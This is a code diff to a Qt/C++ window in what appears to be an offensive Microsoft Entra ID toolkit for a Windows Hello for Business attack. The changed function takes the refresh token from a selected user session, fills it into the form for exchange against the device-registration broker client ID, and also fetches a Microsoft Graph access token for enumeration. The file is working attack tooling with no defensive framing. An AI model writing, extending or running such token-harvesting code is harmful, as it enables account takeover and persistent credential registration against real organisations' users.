@@ -1,6 +1,7 @@
 #include "WHfBAttackWindow.h"
 #include "StyleManager.h"
 #include "UserSelectorWidget.h"
+#include "TokenHelper.h"
 #include "TokenStore.h"
 
 #include <QVBoxLayout>
@@ -360,17 +361,27 @@ void WHfBAttackWindow::autoFetchTokens() {
         return;
     }
 
-    appendLog("[*] Fetching broker token for selected user...", "cyan");
-    appendLog("[!] Note: WHfB attack requires broker token (29d9ed98-a469-4536-ade2-f981bc1d605e)", "yellow");
+    appendLog("[*] Loading session tokens for WHfB registration...", "cyan");
 
-    // Try to get any available token - the Python script will exchange it
+    // WHfB key registration needs the REFRESH token - the helper (DeviceCode2WFH.py)
+    // exchanges it for the device-registration broker audience
+    // (29d9ed98-a469-4536-ade2-f981bc1d605e) itself. Populate it from the session.
+    const QString sid = userSelector->selectedSession();
+    QString rt, tid, upn;
+    if (TokenHelper::instance()->getRefreshTokenForSession(sid, rt, tid, upn) && !rt.isEmpty()) {
+        refreshTokenInput->setPlainText(rt);
+        appendLog("[+] Refresh token loaded (used for broker/DRS exchange)", "green");
+    } else {
+        appendLog("[!] No refresh token for this session - use the Device Code flow for broker access", "yellow");
+    }
+
+    // Also pull a Graph access token for context/enumeration.
     userSelector->fetchToken("https://graph.microsoft.com", [this](bool success, const QString &token, const QString &error) {
         if (success) {
-            // Graph token won't work directly, but refresh token might
-            appendLog("[!] Got Graph token - refresh token may work for broker exchange", "yellow");
-            appendLog("[*] You may need to use Device Code flow for proper broker access", "cyan");
+            accessTokenInput->setPlainText(token);
+            appendLog("[+] Access token acquired", "green");
         } else {
-            appendLog(QString("[-] Failed to fetch token: %1").arg(error), "red");
+            appendLog(QString("[-] Failed to fetch access token: %1").arg(error), "red");
         }
     });
 }
